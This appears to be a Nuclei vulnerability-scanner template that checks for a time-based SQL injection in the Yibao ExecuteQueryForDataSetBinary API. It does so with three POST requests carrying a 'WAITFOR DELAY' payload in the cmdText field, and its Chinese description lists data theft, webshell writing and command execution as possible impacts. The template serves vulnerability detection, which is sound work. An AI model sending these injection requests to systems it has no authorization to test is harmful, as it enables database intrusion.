id: yibao-ExecuteQueryForDataSetBinary-sqli
info:
  name: yibao-ExecuteQueryForDataSetBinary-sqli
  author: apple
  severity: high
  description: 易宝ExecuteQueryForDataSetBinary sql注入，黑客可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |-
        POST /api/system/ExecuteQueryForDataSetBinary HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Accept-Encoding: gzip
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Content-Length: 45

        token=zxh&cmdText=;WAITFOR DELAY '0:0:3'--
      - |-
        POST /api/system/ExecuteQueryForDataSetBinary HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Accept-Encoding: gzip
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Content-Length: 45

        token=zxh&cmdText=;WAITFOR DELAY '0:0:6'--
      - |-
        POST /api/system/ExecuteQueryForDataSetBinary HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Accept-Encoding: gzip
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Content-Length: 45

        token=zxh&cmdText=;WAITFOR DELAY '0:0:9'--
        
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"